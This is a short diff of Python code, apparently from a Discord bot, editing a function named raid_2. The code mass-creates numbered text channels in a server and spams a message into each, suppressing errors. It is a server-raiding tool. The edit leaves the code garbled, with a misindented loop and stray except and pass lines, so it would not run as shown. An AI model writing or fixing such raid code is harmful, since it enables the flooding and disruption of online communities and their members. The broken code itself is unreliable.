@@ -78,12 +78,19 @@ async def raid_2(
 
     # rôles
     try:
-        for i in range(500):
-            channel = await guild.create_text_channel(name=f"{nom}-{i+1}")
+for i in range(nombre):
+    try:
+        channel = await guild.create_text_channel(name=f"{nom}-{i+1}")
 
-try:
-    await channel.send("bonjour")
-except:
+        try:
+            await channel.send("bonjour")
+        except:
+            pass
+
+        await asyncio.sleep(0.1)
+
+    except:
+        break
     pass
     except Exception as e:
         await interaction.edit_original_response(
